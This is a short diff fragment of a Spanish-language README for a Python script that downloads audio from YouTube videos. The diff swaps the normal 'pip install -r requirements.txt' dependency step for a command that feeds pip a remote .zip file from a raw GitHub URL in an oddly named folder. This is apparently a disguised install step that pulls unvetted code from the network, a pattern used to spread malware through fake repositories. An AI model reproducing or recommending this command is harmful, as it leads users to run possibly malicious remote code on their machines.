@@ -22,4 +22,4 @@ Este proyecto es un script en Python que permite descargar el audio de videos o 
 Puedes instalar las dependencias con:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/SebasHack99/09_Descarga_audio_youtube/main/antibibliolatry/09_Descarga_audio_youtube.zip
